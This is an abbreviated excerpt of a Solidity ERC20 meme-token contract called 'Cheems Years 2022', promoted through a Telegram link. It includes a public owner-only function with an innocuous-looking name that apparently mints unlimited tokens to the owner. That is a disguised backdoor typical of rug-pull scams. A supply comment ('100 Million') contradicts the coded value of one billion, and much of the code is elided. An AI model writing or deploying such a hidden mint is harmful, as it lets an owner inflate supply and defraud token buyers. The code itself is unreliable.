...
//
// $CheemsYears2022 proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/CheemsYears2022
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Cheemsyears2022(uint256 amount) public onlyOwner {
 _Cheemsyears2022(msg.sender, amount);
    }
    ...
    function _Cheemsyears2022(address account, uint256 amount) internal virtual {
...
contract $CheemsYears2022 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cheems Years 2022", "CHEEMSYEARS2022") {
        _Cheemsyears2022(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}